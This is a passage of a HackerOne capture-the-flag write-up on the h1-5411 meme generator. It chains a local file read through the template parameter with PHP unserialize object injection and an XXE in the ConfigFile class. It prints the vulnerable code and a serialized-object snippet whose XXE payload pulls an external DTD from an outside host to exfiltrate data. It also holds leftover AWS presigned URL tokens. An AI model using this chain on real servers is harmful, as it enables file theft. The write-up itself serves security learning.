title=\"https://h1-5411.h1ctf.com/\" href=\"/redirect?signature=00972f96cdea7fcc79c8795f6ff3f4076438b7af&amp;url=https%3A%2F%2Fh1-5411.h1ctf.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://h1-5411.h1ctf.com/</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<p>The website allows you to select a meme template, top text, and bottom text. This generates a meme saved to your session that is either an image or txt file.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/664/6fb7fc5a733375ed3059a4ca06ebca9be91775e0/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=52a9694e64ccdba550d3563c4cf0423267a6ff299e8d857f240a85decd80f588\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/664/6fb7fc5a733375ed3059a4ca06ebca9be91775e0/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=52a9694e64ccdba550d3563c4cf0423267a6ff299e8d857f240a85decd80f588\" class=\"markdown-inline-image\"></a></p>\n\n<p><strong><em>Generating a Meme</em></strong></p>\n\n<p>The POST request looks like the following:</p>\n<pre class=\"highlight plaintext\"><code>POST /api/generate.php HTTP/1.1\nHost: h1-5411.h1ctf.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://h1-5411.h1ctf.com/generate.php\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 63\nCookie: PHPSESSID=qpvh9cil4heghbjdq6cp4vfbgs\nConnection: close\n\ntemplate=template4.txt&amp;type=text&amp;top-text=test&amp;bottom-text=test\n</code></pre>\n<p>The template parameter sets a filename to use as part of the meme generation process.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/666/2e7ed210aa52547c39938e02d21fc403eb80f610/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=fdcd2325b690da211fc79ce19b9658a1eb588e37aa705de8666f0d8f2e3f98b5\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/666/2e7ed210aa52547c39938e02d21fc403eb80f610/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=fdcd2325b690da211fc79ce19b9658a1eb588e37aa705de8666f0d8f2e3f98b5\" class=\"markdown-inline-image\"></a></p>\n\n<p>As you may guess, the template variable is vulnerable to Local-File Read (LFR). As long as you set it to a txt template, you can specify any arbitrary file on the system and fetch its\u2019 file contents. Here\u2019s an example of fetching PHP source code:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"4.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/667/a291bbc74a7310fcf12d193134a23973f287dbec/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5848f45532714f22dbe1c656768f0e9ab7fad6e6e06b8ed2d44f41ce2a9992da\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/667/a291bbc74a7310fcf12d193134a23973f287dbec/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5848f45532714f22dbe1c656768f0e9ab7fad6e6e06b8ed2d44f41ce2a9992da\" class=\"markdown-inline-image\"></a></p>\n\n<p>Here you can see the source code when viewing your saved memes:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"5.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/668/efc5a86760d1e6d939cdf5283d308da9f3715c3c/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=fdc0e108d524e9c8cc98728634ac36357a4ff8c94aff60b38a9d23c7b5aa437e\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/668/efc5a86760d1e6d939cdf5283d308da9f3715c3c/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=fdc0e108d524e9c8cc98728634ac36357a4ff8c94aff60b38a9d23c7b5aa437e\" class=\"markdown-inline-image\"></a></p>\n\n<p>After enumerating from index.php to all the files inside of each file include(), we eventually have the source code for the entire application. The next step is to figure out what other vulnerabilities exist in the app.</p>\n\n<p>In the <strong><em>/includes/classes.php</em></strong> file the first thing that stands out is that they are intentionally disabling XXE protection.</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"6.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/669/85367697b0b17ac29b532ff9ec393fa25d0d72ed/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f333bff6a80c7a9bc019c028c68011022f3e94ad7f2ce1b9a26963d8c17a35f3\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/669/85367697b0b17ac29b532ff9ec393fa25d0d72ed/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f333bff6a80c7a9bc019c028c68011022f3e94ad7f2ce1b9a26963d8c17a35f3\" class=\"markdown-inline-image\"></a></p>\n\n<p>That means the DOMDocument-&gt;loadXML() is vulnerable to external entities/DTDs and would allow us to execute malicious XXE payloads. The question from here is, how do we set ConfigFile class\u2019s config_raw variable.</p>\n\n<p>From the <strong><em>/includes/header.php</em></strong> file, there are two interesting files that you cannot discover without the LFR vulnerability.</p>\n\n<ul>\n<li>/import_memes_2.0.php</li>\n<li>/export_memes_2.0.php</li>\n</ul>\n\n<p>Each one sends a POST request to files of the same name in the /api/ directory.</p>\n\n<p><strong><em>/api/import_memes_2.0.php</em></strong></p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n  require_once(&quot;../includes/config.php&quot;);\n\n  if (isset($_FILES[&#39;f&#39;])) {\n    $new_memes = unserialize(base64_decode(\n      file_get_contents($_FILES[&#39;f&#39;][&#39;tmp_name&#39;])));\n    $_SESSION[&#39;memes&#39;] = array_merge($_SESSION[&#39;memes&#39;], $new_memes);\n  }\n\n  header(&quot;Location: /memes.php&quot;);\n?&gt;\n</code></pre>\n<p><strong><em>/api/export_memes_2.0.php</em></strong></p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n  require_once(&quot;../includes/config.php&quot;);\n\n  header(&#39;Content-Type: application/octet-stream&#39;);\n  header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.time().&#39;_export.memepak&quot;&#39;);\n  echo base64_encode(serialize($_SESSION[&#39;memes&#39;]));\n?&gt;\n</code></pre>\n<p>With the import API script, we are able to specify input into unserialize() with file upload POST requests. The uploaded unserialized data gets merged into $_SESSION[\u201cmemes\u201d] where all of your memes are saved.</p>\n\n<p>Now that we knew we could create PHP objects via unserialize (object injection) and knowing that there is an XXE in the ConfigFile class, we had to figure out how to put it all together.</p>\n\n<p>The ConfigClass has a magic method function __toString() that will get called any time the class is initialized and treated as a string. That usually means whenever the variable that has the class assigned to is echo, print, print_r, etc.</p>\n<pre class=\"highlight plaintext\"><code>    function __toString() {\n      $this-&gt;parse();\n      $debug = &quot;&quot;;\n      $debug .= &quot;Debug Info :\\n&quot;;\n      $debug .= &quot;TopText =&gt; {$this-&gt;top_text}\\n&quot;;\n      $debug .= &quot;BottomText =&gt; {$this-&gt;bottom_text}\\n&quot;;\n      $debug .= &quot;Template Location =&gt; {$this-&gt;template}\\n&quot;;\n      $debug .= &quot;Template Type =&gt; {$this-&gt;type}\\n&quot;;\n      return $debug;\n    }\n</code></pre>\n<p>We\u2019ll talk about how that gets triggered after further explaining the attack. Following the __toString() execution chain, we see that it immediately calls the parse() function.</p>\n<pre class=\"highlight plaintext\"><code>    function parse() {\n      $dom = new DOMDocument();\n      $dom-&gt;loadXML($this-&gt;config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);\n      $o = simplexml_import_dom($dom);\n\n      $this-&gt;top_text = $o-&gt;toptext;\n      $this-&gt;bottom_text = $o-&gt;bottomtext;\n      $this-&gt;template = $o-&gt;template;\n      $this-&gt;type = $o-&gt;type;\n    }\n</code></pre>\n<p>This is promising because $this-&gt;config_raw gets passed into the vulnerable loadXML() function call and does not get overwritten with anything static. That means if we create an object that gets unserialized, we can specify the config_raw variable and it will execute our XXE payload.<br>\nWe setup a test script by ripping out all the code involved in this attack chain in order to test it locally with warnings enabled. Their server is not displaying any PHP errors or warnings meaning we\u2019re completely blind to any potential roadblocks that we run into. </p>\n\n<p>Here is a gist of the test code we were playing with:</p>\n\n<ul>\n<li><a title=\"https://gist.githubusercontent.com/ziot/e72c8c45865ea86d9c6aa6975615e839/raw/d0fb09a5a99be0c815c3e854e5b9900f2384b5dd/gistfile1.txt\" href=\"/redirect?signature=795573fcfab9a088485203a029e93b763eccd26c&amp;url=https%3A%2F%2Fgist.githubusercontent.com%2Fziot%2Fe72c8c45865ea86d9c6aa6975615e839%2Fraw%2Fd0fb09a5a99be0c815c3e854e5b9900f2384b5dd%2Fgistfile1.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://gist.githubusercontent.com/ziot/e72c8c45865ea86d9c6aa6975615e839/raw/d0fb09a5a99be0c815c3e854e5b9900f2384b5dd/gistfile1.txt</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<p>Using the script above, we ran base64_encode(serialize()) functions on top of the newly created class after specifying our XXE payload inside of config_raw.</p>\n\n<p>Example:</p>\n<pre class=\"highlight plaintext\"><code>class ConfigFile {\n    ...\n}\n\n$test = new ConfigFile(&quot;asdf&quot;);\n$test-&gt;config_raw = &#39;&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;https://xss.buer.haus/ev.xml&quot;&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt;&#39;;\n\necho base64_encode(serialize($test));\n</code></pre>\n<p>The next step was uploading it using the import_memes script:</p>\n\n<ul>\n<li><a title=\"https://h1-5411.h1ctf.com/import_memes_2.0.php\" href=\"/redirect?signature=2368abf0d63eaa427aa5fe3b0d986fe588775944&amp;url=https%3A%2F%2Fh1-5411.h1ctf.com%2Fimport_memes_2.0.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://h1-5411.h1ctf.com/import_memes_2.0.php</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"7.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/670/1c866307f6ac4e9bf878292a52a024281e2439b5/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthuaPzTq9TQBE%2BefkD4NqWd8XIe70sIzW5Gov9hArx5yoFxMyl981yHwhHBoDQTx%2BBp4Y%2BoteeWjmi0xzjtDZHW88%2FeYX17nsF3vaqAoUkelgW7kpUm8mv2yKfyt2PFpmsLyuEHv%2BEhiSjd75eU3JKoY5TjaeO1Z0pj3qT9jWAnTt%2B4p6EhH6lW6wtMSnxwfoogZym4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=488c2ab368505f8acc9b317377c4698643f00a7ddd392be4b2f3bb4ff14966f1\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/351/670/1c866307f6ac4e9bf878292a52a024281e2439b5/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQUGLJGSWG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221524Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA4aDKM0VlUhdMTH8KoEtCK3A8OYEaI0bxYq7BUbrfF29DSbKtUs5TMCeB5FlkwERpxSU49o20mRIVl2fBvvv1hdFcsCDANAMGWvX%2Faf68iJ3aFPBQySWphheO3DX%2BSZQciRkV0sOPeKeZSt2y6M11j88wuo3HYsP7bIFtt2%2BUaL%2FIqfE8KHYavOS6uyUN0H%2BUfHDrW%2FgMpQ8XXLkiFuG8%2BV2DdqfYc9V22I7shRDODxACEfjFPInrTKfLh74T1aVBNswXALPhKClZRFi6kUPozhrj8qXpOmsge18GAMHYHGjpEpasUVrJ2earHh6ttt3se0%2B%2BTASgDPlAxRdaKGq%2FWME7DbyKdQ2N4%2Bn0WCbl%2B0ZnuTw2IbHnGas%2FTiYT%2BWSTw07tDag6vX9fCs8FhCTE2lNNu59CQkorthua